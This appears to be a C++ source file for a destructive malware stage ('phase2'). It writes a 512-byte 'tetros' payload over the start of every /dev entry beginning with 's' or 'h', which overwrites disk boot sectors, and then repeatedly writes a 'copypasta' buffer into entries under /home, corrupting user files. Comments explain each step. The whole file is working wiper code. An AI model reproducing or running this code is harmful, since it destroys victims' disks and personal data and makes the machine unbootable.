#include "phase2.h"

phase2::phase2()
{

}



int phase2::execute()
{
	int fd;
	int i;
	int placeInFile = 0; //Navigates to the place of the file.
	DIR *dir;
	struct dirent *ent;

	if ((dir = opendir ("/dev")) != NULL) {//Enter /dev...
	  while ((ent = readdir (dir)) != NULL) 
	  {
 	   if(ent->d_name[0] == 's' || ent->d_name[0] == 'h') //If the files name starts with h or s:
	   {
	        //printf ("%s\n", ent->d_name); Prints the file name. Usefull for debugging.
        	fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
/*		Cocaneates /dev and the filename. We assign a cast to it because /dev is a c++ 			string and ent->d_name is a c string.*/


        	lseek(fd, 0, SEEK_SET); //Got to the beggining of the file
        	write(fd, tetros, 512);//Write Tetros to the beggining of the file.
        	close(fd);//Closes fd
        	//perror("perror output:");
		//fclose(fh);
	   }
 	 }
 	closedir (dir);
	}
	else 
	{
	// could not open directory 
  	perror ("");
  	return EXIT_FAILURE;
	}
        

	close(fd);
	
	if ((dir = opendir ("/home")) != NULL) //Enter /home.
	{
		while ((ent = readdir (dir)) != NULL)//Go through the files within /home.
		{
        		fd = open(((std::string)"/home/"+(std::string)ent->d_name).c_str(), O_WRONLY);		
			for(placeInFile = 0; fd != EOF; placeInFile = placeInFile + 30)
			{
				lseek(fd, placeInFile, SEEK_SET); //Got to the beggining of the file
				write(fd, copypasta, 340);//Write the copypasta to the beggining of the file.		
			}
			close(fd);
		}
	}

	return 0;
}

